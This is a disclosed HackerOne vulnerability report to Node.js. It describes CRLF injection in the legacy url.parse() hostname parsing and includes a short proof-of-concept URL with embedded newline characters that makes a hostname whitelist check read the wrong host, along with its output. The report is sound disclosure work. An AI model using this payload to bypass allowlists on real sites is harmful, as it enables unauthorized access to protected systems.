# CRLF Injection in legacy url API (url.parse().hostname)

## Report Details
- **Report ID**: 771596
- **URL**: https://hackerone.com/reports/771596
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-10T12:07:06.310Z
- **Disclosed**: 2020-01-10T17:55:53.774Z

## Reporter
- **Username**: vavkamil
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**

There is CRLF Injection in legacy `url.hostname()` API.

**Description:**

During the recent penetration test, I have found a whitelist bypass using CRLF Injection. We did a code review and determined the issue is in a legacy url.hostname() API. Not sure if it's a known issue or not, I wasn't able to find any report related to `url.hostname()`.

## Steps To Reproduce:

```
poc_url = "http://test1.com\n\rtest2.com"

const url = require('url');
console.log("Vulnerable: ", url.parse(poc_url).hostname)

console.log("\n")

const myURL = new URL(poc_url);
console.log("Not Vulnerable: ", myURL.hostname)
```

Not exactly sure where is the problem, but probably in here:
`https://github.com/nodejs/node/blob/master/lib/url.js#L298-L340`

## Impact:

Even if it's legacy code, there still might be a lot of projects and codebases relying on it. As mentioned in the description, I was able to bypass a whitelist function during the recent penetration test and exploit a medium/high vulnerability thanks to it.

## Supporting Material/References:

Poc:
```
poc_url = "http://test1.com\n\rtest2.com"

const url = require('url');
console.log("Vulnerable: ", url.parse(poc_url).hostname)

console.log("\n")

const myURL = new URL(poc_url);
console.log("Not Vulnerable: ", myURL.hostname)
```

Output:
```
Vulnerable:  test1.com

Not Vulnerable:  test1.comtest2.com
```

## Impact

Whitelist function can use url.parse("https://example.com").hostname to check for allowed hostnames. It can be easily bypassed using CRLF injection and it can lead to whitelist bypass and compromise of the website.

## Attachments
No attachments
